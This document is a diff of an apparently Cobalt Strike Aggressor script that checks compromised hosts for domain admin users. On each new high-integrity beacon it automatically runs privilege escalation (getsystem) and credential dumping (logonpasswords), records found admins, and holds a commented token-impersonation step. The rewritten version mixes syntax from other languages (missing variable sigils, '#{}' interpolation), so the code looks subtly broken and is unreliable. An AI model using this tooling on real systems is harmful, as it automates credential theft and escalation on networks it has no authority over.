@@ -1,49 +1,73 @@
- # quickly run powershellimport
-sub powershellimport {
-  bpowershell_import($1, script_resource("Invoke-DACheck.ps1"));
+# Improved Domain Admin Detection and Privilege Escalation Script
+
+# Global variables
+global('@domain_admins');
+global('$listening');
+@domain_admins = @("administrator"); # Initial DA list (can be expanded)
+$listening = 1; # Enable beacon output parsing by default
+
+# Function to import the PowerShell script
+sub powershellimport(bid) {
+    bpowershell_import(bid, script_resource("Invoke-DACheck.ps1"));
 }
 
+# Alias to check for Domain Admin privileges
 alias checkda {
-  powershellimport($1);
-  bpowershell($1, 'Invoke-DACheck');
+    powershellimport($1);
+    bpowershell($1, 'Invoke-DACheck');
 }
 
-# register the GetDa command
+# Register the checkda command
 beacon_command_register(
-  "checkda", 
-  "Checks if the current user is in the DA Group", 
-  "Synopsis: echo [no arguments]\n\nChecks using Powershell that supports (2.0 or later with 3.5 .NET) \n or (PS 4.0 or later) to perform Domain Group queries.");
+    "checkda",
+    "Checks if the current user is in the DA Group",
+    "Synopsis: checkda\n\nChecks using PowerShell for Domain Admin privileges."
+);
 
-# set up the Initial check
-on beacon_initial {
-  powershellimport($1);
-  bpowershell($1, 'Invoke-DACheck -Initial True');
-  $a = binfo($1, "user");
-  $b = "*";
-  if ($b isin $a)
-    {
-    bgetsystem($1);
-    blogonpasswords($1);
+# Event handler for initial beacon check-in
+on beacon_initial(bid) {
+    powershellimport(bid);
+    bpowershell(bid, 'Invoke-DACheck -Initial True');
+
+    # Attempt privilege escalation if the user has a high integrity token
+    if (beacon_info(bid, "integrity") == "High") {
+        bgetsystem(bid);
+        blogonpasswords(bid);
     }
 }
 
+# Event handler for beacon output
+on beacon_output(bid, output) {
+    if ($listening) {
+        output = replace(output, 'received output:\n', '');
 
-#NEED TO SETUP A CHECK ARRAY FOR PAST DA FINDS
-# set up event consumer to search for specfic pattern
-# if found alert them via Elog and box
-on beacon_output {
-    $s = replace($2, 'received output:\n'.'');
-    # println($s);
-    $f = "[!] Found-DA-User:";
-    if ($f isin $s)
-      {
-      $pid = binfo($1, "pid");
-      elog("Found DA User at Pid: $pid");
-      show_message("Found DA User at Pid: $pid");
-      beacon_note($1, "DA User on this box");
-      }
-  }
+        # Check for the DA indicator in the output
+        if (output =~ /\[!\] Found-DA-User:/) {
+            @parts = split(':', output);
+            username = trim(@parts[1]);  # Extract the DA username
 
-#  bpowershell($1, '$user = [Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.
-#  WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)');
+            addDA(username); # Add the DA to the list
 
+            pid = binfo(bid, "pid");
+            elog("[+] Found DA User '#{username}' at PID: #{pid}");
+            show_message("[+] Found DA User '#{username}' at PID: #{pid}");
+            beacon_note(bid, "DA User '#{username}' on this box");
+
+            # Optional: Perform further actions, e.g., attempt token impersonation
+            # bpowershell(bid, "Invoke-TokenManipulation -ImpersonateUser '#{username}'"); 
+        }
+    }
+}
+
+# Function to add a Domain Admin to the list
+sub addDA(username) {
+    if (username !in @domain_admins) {
+        add(@domain_admins, username);
+        println("[+] Added #{username} to Domain Admins list");
+    }
+}
+
+# Function to trim leading/trailing whitespace
+sub trim(str) {
+    return replace(str, "^\\s+|\\s+$", "");
+}
